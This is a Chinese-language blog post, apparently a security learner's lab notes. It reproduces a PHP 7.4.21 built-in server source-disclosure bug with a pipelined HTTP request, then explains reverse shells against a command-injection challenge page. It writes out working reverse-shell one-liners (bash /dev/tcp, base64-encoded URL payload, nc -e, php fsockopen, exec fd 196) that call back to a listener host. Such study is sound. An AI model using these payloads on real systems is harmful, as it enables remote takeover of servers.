@@ -1,0 +1,320 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>低版本php下信息泄露的CVE漏洞与反弹shell | ZLARYY</title><meta name="author" content="ZLARYY"><meta name="copyright" content="ZLARYY"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="低版本php下信息泄露的CVE漏洞为了复现这个漏洞拉个docker老是出问题，直接把这篇文章（https:&#x2F;&#x2F;blog.csdn.net&#x2F;Kawakaze_JF&#x2F;article&#x2F;details&#x2F;133046885?sharetype&#x3D;blogdetail&amp;shareId&#x3D;133046885&amp;sharerefer&#x3D;APP&amp;sharesource&#x3D;2503_93592530&amp;a">
+<meta property="og:type" content="article">
+<meta property="og:title" content="低版本php下信息泄露的CVE漏洞与反弹shell">
+<meta property="og:url" content="https://zlaryy123.github.io/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="ZLARYY">
+<meta property="og:description" content="低版本php下信息泄露的CVE漏洞为了复现这个漏洞拉个docker老是出问题，直接把这篇文章（https:&#x2F;&#x2F;blog.csdn.net&#x2F;Kawakaze_JF&#x2F;article&#x2F;details&#x2F;133046885?sharetype&#x3D;blogdetail&amp;shareId&#x3D;133046885&amp;sharerefer&#x3D;APP&amp;sharesource&#x3D;2503_93592530&amp;a">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://zlaryy123.github.io/img/avertar.png">
+<meta property="article:published_time" content="2026-03-12T08:30:00.000Z">
+<meta property="article:modified_time" content="2026-03-12T08:26:53.325Z">
+<meta property="article:author" content="ZLARYY">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zlaryy123.github.io/img/avertar.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "低版本php下信息泄露的CVE漏洞与反弹shell",
+  "url": "https://zlaryy123.github.io/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/",
+  "image": "https://zlaryy123.github.io/img/avertar.png",
+  "datePublished": "2026-03-12T08:30:00.000Z",
+  "dateModified": "2026-03-12T08:26:53.325Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ZLARYY",
+      "url": "https://ZLARYY123.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://zlaryy123.github.io/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '低版本php下信息泄露的CVE漏洞与反弹shell',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ZLARYY</span></a><a class="nav-page-title" href="/"><span class="site-name">低版本php下信息泄露的CVE漏洞与反弹shell</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">低版本php下信息泄露的CVE漏洞与反弹shell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-03-12T08:30:00.000Z" title="Created 2026-03-12 16:30:00">2026-03-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-03-12T08:26:53.325Z" title="Updated 2026-03-12 16:26:53">2026-03-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="低版本php下信息泄露的CVE漏洞"><a href="#低版本php下信息泄露的CVE漏洞" class="headerlink" title="低版本php下信息泄露的CVE漏洞"></a>低版本php下信息泄露的CVE漏洞</h1><p>为了复现这个漏洞拉个docker老是出问题，直接把这篇文章（<a target="_blank" rel="noopener" href="https://blog.csdn.net/Kawakaze_JF/article/details/133046885?sharetype=blogdetail&shareId=133046885&sharerefer=APP&sharesource=2503_93592530&sharefrom=qq%EF%BC%89%E9%87%8C%E7%9A%84%E5%91%BD%E4%BB%A4%E5%80%9F%E6%9D%A5%E7%94%A8%E7%94%A8%E5%90%A7%EF%BC%9A">https://blog.csdn.net/Kawakaze_JF/article/details/133046885?sharetype=blogdetail&amp;shareId=133046885&amp;sharerefer=APP&amp;sharesource=2503_93592530&amp;sharefrom=qq）里的命令借来用用吧：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">apt-get install docker.io</span><br><span class="line">//下载dpcker</span><br><span class="line"></span><br><span class="line">service docker start</span><br><span class="line">//启动docker</span><br><span class="line"></span><br><span class="line">docker pull php:7.4.21 </span><br><span class="line">//拉取php 7.4.21的镜像</span><br><span class="line"></span><br><span class="line">docker run -it -p 8080:80  4ad229e4e700  /bin/bash</span><br><span class="line">//运行镜像 将docker 的80端口映射到kali的8080端口</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;?php \$flag=ZLARYY&#123;2L47yY&#125;&quot; &gt; /var/www/html/secret.php</span><br><span class="line">//写入文件</span><br><span class="line"></span><br><span class="line">php -S 0.0.0.0:80</span><br><span class="line">//通过php -S开启web服务(必须)</span><br></pre></td></tr></table></figure>
+
+<p>关于这个漏洞的详细部分在：</p>
+<p><a target="_blank" rel="noopener" href="https://projectdiscovery.io/blog/php-http-server-source-disclosure#root-cause-analysis">https://projectdiscovery.io/blog/php-http-server-source-disclosure#root-cause-analysis</a></p>
+<p>恕我实在无能为力全部理解，只能靠AI帮我解释一下：</p>
+<p>PHP 内置 Web 服务器（<code>php_cli_server</code>）底层的 C 语言状态机，在处理 <strong>“HTTP 请求管道化（Pipelining）”</strong> 时发生了严重的指针错乱。</p>
+<p>正常的 HTTP 是一问一答（发一个请求，等一个响应）。但管道化允许你<strong>把两个甚至多个 HTTP 请求，硬塞进同一个 TCP 数据包里同时发过去！</strong></p>
+<p>所以接下来的逻辑是这样：我们的paylaod当中包含两个GET请求，并且故意不加上<code>Content-Length</code>请求头，这样<code>php_http_parse</code>在解析完第一个请求头之后由于没有看到长度，提前触发了<code>messge_complete(消息完成)</code>的回调函数，但我们还加上了第二个请求在后面，此时状态机会被强行拉回初始状态，在这样的条件下，php引擎的内部标志位被覆盖了，原本应该判断<code>.php</code>后缀需要拿去执行，但由于错误地把<code>is_static_file</code>的标志位设置为了1，那么php引擎就将这个<code>.php</code>文件视为静态文件，如<code>.txt</code>，就导致了php代码没有被执行，还输出了源码作为结果</p>
+<p>在确定请求文件是静态文件还是php文件时，利用的是如下代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static  int  php_cli_server_dispatch(php_cli_server *server, php_cli_server_client *client) &#123;</span><br><span class="line">...</span><br><span class="line">	if (client-&gt;request.ext_len != 3</span><br><span class="line">	|| (ext[0] != &#x27;p&#x27; &amp;&amp; ext[0] != &#x27;P&#x27;) || (ext[1] != &#x27;h&#x27; &amp;&amp; ext[1] != &#x27;H&#x27;) || (ext[2] != &#x27;p&#x27; &amp;&amp; ext[2] != &#x27;P&#x27;)</span><br><span class="line">	|| !client-&gt;request.path_translated) &#123;</span><br><span class="line"></span><br><span class="line">	is_static_file = 1;</span><br><span class="line">	&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述代码包含一个检查，用于确定请求的文件应被视为静态文件还是 PHP 文件。这是通过检查文件扩展名来实现的。如果扩展名不是 <code>.src  .php</code>或<code>.PHP  .ph</code>，或者扩展名的长度不等于 3，则该文件被视为静态文件。这通过将变量设置<code>is_static_file</code>为 1 来指示。</p>
+<p>代码还会检查对象<code>path_translated</code>的某个字段<code>client-&gt;request</code>是否为空。该字段包含文件系统中请求文件的完整路径，用于定位和提供该文件。如果该<code>path_translated</code>字段为空，则表示找不到请求的文件，请求将被视为错误。</p>
+<p>那么接下来尝试尝试复现这个漏洞，先给出poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /secret.php HTTP/1.1\r\n</span><br><span class="line">Host: 192.168.xxx.xxx:8080\r\n</span><br><span class="line">\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /ZLARYY HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/1.png" class="" width="1">
+
+<p>由于我们的攻击原理中不能让其找到<code>Content-Length</code>，所以需要关闭<code>Update Content-Length</code>，注意上面的poc里面的<code>\r\n</code>不是手动加上去的，而是开启了burp的<code>\n</code></p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/2.png" class="" width="2">
+
+<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>其实挺早就了解到有这个方法了，在搭建起来kali里面的apache之后现在总算有机会尝试复现了</p>
+<p>反弹shell（reverse shell），就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端 的角色反转。</p>
+<p>关于反弹shell我的理解是kali上开启监听端口，然后让靶机上开启命令行并且主动连接我的监听端，从而让我在监听端的输入都转入到靶机上，而靶机上的输出都返回到我的监听端</p>
+<p>一种特别典型的利用反弹shell的题目是<strong>无回显RCE</strong></p>
+<p>题目如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h2><p>这里我直接先给出payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?cmd=echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjE1Mi4xMjgvNzc3NyAwPiYx%20|%20base64%20-d%20|%20bash</span><br><span class="line"></span><br><span class="line">其实原paylaod长这样：</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.152.128/7777 0&gt;&amp;1</span><br><span class="line">同时我们还需要在kali上开启</span><br><span class="line">nc -lvnp 7777</span><br></pre></td></tr></table></figure>
+
+<p><strong>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.152.128&#x2F;7777 0&gt;&amp;1</strong>：</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pandana/p/16289320.html">https://www.cnblogs.com/pandana/p/16289320.html</a></p>
+<p>1、bash -i：在靶机上启动一个交互式（interactive）的Bash终端</p>
+<p>2、&#x2F;dev&#x2F;tcp&#x2F;是Linux中的一个特殊设备文件,实际这个文件是不存在的，它只是 bash 用来实现网络请求的一个接口。打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在&#x2F;dev&#x2F;udp&#x2F;。</p>
+<p>3、192.168.1.102&#x2F;7777则是攻击者主机的地址和监听的端口了。</p>
+<p>4、“&gt;&amp;”和“0&gt;&amp;1”</p>
+<p>要想了解“&gt;&amp;”和“0&gt;&amp;1”，首先我们要先了解一下Linux文件描述符和重定向。linux shell下常用的文件描述符是：</p>
+<p>(1)标准输入(stdin) ：代码为 0 ，使用 &lt; 或 &lt;&lt;</p>
+<p>(2)标准输出(stdout)：代码为 1 ，使用 &gt; 或 &gt;&gt;</p>
+<p>(3)标准错误输出(stderr)：代码为 2 ，使用 2&gt; 或 2&gt;&gt;</p>
+<p>这里的”&gt;&amp;”与”&amp;&gt;”是等价的，都是表示混合输出，即标准输出1 + 错误输出2。其实 2&gt;&amp;1也是将标准错误输出重定向到标准输出中的意思。那么按照这个逻辑，“0&gt;&amp;1”就是将标准输入重定向到标准输出中。事实也就是如此，“0&gt;&amp;1”跟“0&amp;&gt;1”同样也是等价的。</p>
+<p>回到题目上来说，由于我们的payload里面出现了<code>&amp;</code>符号，那么在URL传参时会把我们的payload截断，所以必须用<code>echo &quot;[base64]&quot;|base64 -d|sh</code>对<code>&amp;</code>绕过，除此之外，直接解析我们的payload的是<code>/bin/sh指向的dash</code>，这个dash在读到<code>&gt;&amp;</code>会直接报语法错误，用echo和管道符最后时候用bash或者sh才会将我们的bash反弹payload交给bash执行</p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/3.png" class="" width="3">
+
+<p>这样我们就算成功反弹shell了，之后我们在这个命令行上输入的所有命令都与index.php的限制没有任何关系了，我们直接与靶机的命令行交互，并且靶机的执行结果直接显示到我们的bash上：</p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/4.png" class="" width="4">
+
+<p>接下来我想深入了解一下<code>&gt;&amp;</code>和<code>0&gt;&amp;1</code>：</p>
+<p>在本博客的RCE部分中提到过<code>&amp;</code>，当时是说：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将前面的命令放在后台执行，不等前面的命令执行结束就开始执行后面的命令，还有一种用法是在一行命令末尾加上&amp;符号使其放在后台运行，比如下载文件……</span><br></pre></td></tr></table></figure>
+
+<p>不过这里不是这样，<code>&gt;&amp;</code>表示重定向操作符，<code>&amp;</code>变成了一个指针标记</p>
+<p>不加上<code>&amp;</code>的情况下，<code>echo &quot;ZLARYY&quot; &gt;1</code>表示将ZLARYY字符串写入1这个文件</p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/5.png" class="" width="5">
+
+<p>但是如果加上<code>&amp;</code>之后，<code>echo &quot;ZLARYY&quot; &gt;&amp;1</code>的意思就变成了将这个字符串写进编号为1的系统通道，即标准输出：</p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/6.png" class="" width="6">
+
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/7.png" class="" width="7">
+
+<p>而使用<code>&gt;&amp; /dev/tcp/192.168.152.128/7777</code>的原理其实是这样：</p>
+<p>如同上面的<code>&gt;&amp;shell</code>一样，使用<code>&gt;&amp;</code>之后，系统原本准备去打开或者创建一个文件，但由于bash解释器在把命令交给Linux内核的时候，会先检查一遍要写入的路径，当bash看到路径以<code>/dev/tcp</code>或者<code>/dev/udp</code>开头，会触发一种特殊的拦截机制，这时候就不会去硬盘上创建文件了，而是调用底层的socket()网络编程接口，向对应的IP地址和端口发起一次TCP握手，此时<code>&gt;&amp;</code>作为<strong>混合输出</strong>，将标准输出和标准错误混在一起，最后顺着TCP发送到对应的IP地址和端口</p>
+<p>之后由于存在<code>0&gt;&amp;1</code>和<code>nc</code>命令，系统会将我们输入的<code>cat /flag\n</code>变成纯粹的二进制数据包（TCP payload），顺着虚拟网线传输到靶机上，并且<code>0&gt;&amp;1</code>将靶机的标准输入转接到1通道上，导致传输进来的<code>cat /flag\n</code>被当做靶机的标准输入执行，将标准输出顺着TCP发送到我们的kali上</p>
+<p>那么为什么我的kali上的标准输入会连接到TCP呢？</p>
+<p>这是由于<code>nc</code>命令，一旦<code>nc</code>建立连接，<code>nc(Netcat)</code>会自动把kali的标准输入绑定到TCP连接上，同时将标准输出也绑定上，比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br><span class="line">//开启nc之后用windows访问192.168.152.128:7777</span><br></pre></td></tr></table></figure>
+
+<p>我们能看到：</p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/8.png" class="" width="8">
+
+<p>这意味着我们接收到了Chorm浏览器的请求，此时如果我在kali上输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Hello ZLARYY&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/9.png" class="" width="9">
+
+<p>那么在我们windows上的Chorm就可以看到kali标准输入的结果传输到了Chorm上</p>
+<p>我之前提到exec调用的是<code>/bin/sh的dash</code>而不是bash，其实还有一种方法可以避免使用base64编码和管道符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=bash -c &quot;bash -i &gt;%26 /dev/tcp/192.168.152.128/7777 0&gt;%261&quot;</span><br></pre></td></tr></table></figure>
+
+<p>%26是<code>&amp;</code>的URL编码，<code>-c</code>意味着将一段字符串强制作为bash的命令执行</p>
+<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2><p>当然反弹shell可不止bash，nc反弹之前在限制长度的RCE中学到过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.152.128 7777</span><br></pre></td></tr></table></figure>
+
+<p>在前文我们提到了<code>nc</code>命令可以主动将标准输入和标准输出连接到靶机，<code>-e</code>参数表示execute执行，那么<code>nc -e /bin/bash</code>意思就是一旦连接上，那么就执行<strong>靶机上的</strong><code>/bin/bash</code>程序，并且将标准输出标准输入标准错误输出全部连接到kali中</p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/10.png" class="" width="10">
+
+<h2 id="php反弹"><a href="#php反弹" class="headerlink" title="php反弹"></a>php反弹</h2><p>php反弹利用了php中的原生函数<code>fsockopen</code>，该函数在本博客SSRF一栏中提到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此函数用于打开一个网络Socket连接，允许与任意主机和端口进行原始的TCP通信。它比HTTP库更底层，因此可以与被防火墙保护的、非HTTP协议的内网服务（如Redis、MySQL、Memcached）直接交互。</span><br></pre></td></tr></table></figure>
+
+<p>一种payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.152.128&quot;,7777);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><code>fsockopen(&quot;192.168.152.128&quot;,7777)</code>表示向kali发起TCP连接</p>
+<p><code>exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;)</code>：之前有提到过文件描述符：0表示输入，使用<code>&lt;</code>或<code>&lt;&lt;</code>；1表示输出，使用<code>&gt;</code>或<code>&gt;&gt;</code>；2表示错误，使用<code>2&gt;</code>或<code>2&gt;&gt;</code>。当连接成功后，操作系统会给这个网络套接字分配一个文件描述符，由于0,1,2都有表示，那么这个新建立的socket网络编号通常为3</p>
+<p><code>&lt;&amp;3</code>，<code>&gt;&amp;3</code>，<code>2&gt;&amp;3</code>就像<code>&gt;&amp;</code>和<code>0&gt;&amp;1</code>一样：</p>
+<p><code>&lt;&amp;3</code>：把标准输入接在网络套接字（3）上，用于接收命令</p>
+<p><code>&gt;&amp;3</code>：把标准输出接在网络套接字上，传回执行结果</p>
+<p><code>2&gt;&amp;3</code>：把报错信息接在网络套接字上</p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/11.png" class="" width="11">
+
+<p>还有一种就和bash反弹没什么区别了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;exec(&quot;bash -c \&quot;bash -i &gt;%26 /dev/tcp/192.168.152.128/7777 0&gt;%261\&quot;&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/12.png" class="" width="12">
+
+<h2 id="exec反弹"><a href="#exec反弹" class="headerlink" title="exec反弹"></a>exec反弹</h2><p>exec反弹也是利用文件描述符和网络socket：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash-c &#x27;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.152.128/7777; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><code>0&lt;&amp;196</code>：把标准输入重定向，去读取文件描述符196里面的内容，这是为了确保当前的输入流被强行接管或者纯粹是老版本系统用来初始化占位</p>
+<p><code>exec 196&lt;&gt;/dev/tcp/192.168.152.128/7777</code>：这里有一个exec的另一种用法：当exec后面没有接任何命令，只接了重定向符号时，exec的作用就变成了<strong>永久修改当前bash进程的文件描述符</strong>，而这句话就相当于开启一个与我的kali相连的网络连接，并把这个连接命名为196</p>
+<p><code>sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code>：其实也和<code>&lt;&amp;3</code>，<code>&gt;&amp;3</code>，<code>2&gt;&amp;3</code>一样了</p>
+<img src="/2026/03/12/%E4%BD%8E%E7%89%88%E6%9C%ACphp%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84CVE%E6%BC%8F%E6%B4%9E/13.png" class="" width="13">
+
